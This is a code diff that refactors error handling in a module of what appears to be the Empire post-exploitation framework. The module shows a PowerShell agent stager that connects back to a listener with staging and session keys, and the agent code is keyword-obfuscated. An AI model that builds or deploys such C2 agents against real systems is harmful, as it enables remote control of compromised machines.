@@ -2,12 +2,12 @@ from __future__ import print_function
 
 import os
 import string
-
 # Empire imports
 from builtins import object
 
-from empire.server.utils import data_util
 from empire.server.common import helpers
+from empire.server.utils import data_util
+from empire.server.utils.module_util import handle_error_message
 
 
 class Module(object):
@@ -78,8 +78,7 @@ class Module(object):
         out_file = self.options['OutFile']['Value']
 
         if listener_name not in self.mainMenu.listeners.activeListeners:
-            print(helpers.color("[!] Error: %s not an active listener"))
-            return None
+            return handle_error_message("[!] Error: %s not an active listener")
 
         active_listener = self.mainMenu.listeners.activeListeners[listener_name]
 
@@ -113,8 +112,7 @@ class Module(object):
             agent_code += "\nInvoke-Empire -Servers @('%s') -StagingKey '%s' -SessionKey '%s' -SessionID '%s';" % (
                 host, staging_key, session_key, session_id)
         else:
-            print(helpers.color('[!] Only PowerShell agent generation is supported at this time.'))
-            return ''
+            return handle_error_message('[!] Only PowerShell agent generation is supported at this time.')
 
             # Get the random function name generated at install and patch the stager with the proper function name
         agent_code = data_util.keyword_obfuscation(agent_code)
